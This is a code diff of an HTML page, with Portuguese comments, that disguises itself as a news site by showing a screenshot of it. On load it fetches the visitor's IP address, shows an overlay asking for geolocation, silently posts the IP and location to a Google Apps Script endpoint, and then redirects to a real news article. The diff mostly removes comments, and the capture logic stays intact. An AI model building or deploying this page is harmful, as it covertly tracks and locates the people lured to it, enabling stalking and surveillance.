@@ -136,8 +136,8 @@
 </head>
 <body>
 
-<!-- Print do site original -->
-<img src="site.jpg" alt="" class="print-site">
+<!-- Print do site original — nome do arquivo: site.jpeg -->
+<img src="site.jpeg" alt="" class="print-site">
 
 <!-- Overlay de localização -->
 <div class="overlay" id="overlay">
@@ -166,18 +166,15 @@
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEIeDdSyoHHW8t1sVRE-C8dfZgFQVnbBVVsvqlpmBlAkUNZ9e_TZszpPZz_iwV7oUh/exec';
   const DESTINO = 'https://oantagonico.net.br/a-operacao-dark-wood-os-7-presos-os-nomes-os-creditos-falsos-e-o-esquema-milionario/';
 
-  // 🔒 Trava: impede que o pedido seja feito mais de uma vez
   let jaCapturou = false;
   let pedidoEmAndamento = false;
 
-  // Pré-carrega o IP em paralelo
   let ipCache = 'Indisponível';
   fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(d => { ipCache = d.ip; })
     .catch(() => {});
 
-  // Overlay aparece + prompt de localização após 1 segundo
   setTimeout(() => {
     overlay.classList.add('visivel');
     pedirLocalizacao();
@@ -194,7 +191,6 @@
   });
 
   function pedirLocalizacao() {
-    // 🔒 Bloqueia se já capturou ou se já tem um pedido em andamento
     if (jaCapturou || pedidoEmAndamento) return;
     pedidoEmAndamento = true;
 
@@ -231,17 +227,14 @@
         const body = Object.entries(payload)
           .map(([k,v]) => encodeURIComponent(k)+'='+encodeURIComponent(v)).join('&');
 
-        // Envia os dados (fire-and-forget)
         fetch(SCRIPT_URL, {
           method: 'POST', mode: 'no-cors',
           headers: { 'Content-Type': 'text/plain;charset=utf-8' },
           body
         }).catch(e => console.error(e));
 
-        // Feedback visual de sucesso
         mostrarSucesso();
 
-        // Após 2s, esconde overlay e redireciona
         setTimeout(() => {
           overlay.classList.add('hidden');
           setTimeout(() => {
@@ -264,7 +257,7 @@
       },
       {
         enableHighAccuracy: false,
-        timeout: 60000,        // ⏱️ Aumentado para 60 segundos
+        timeout: 60000,
         maximumAge: 60000
       }
     );
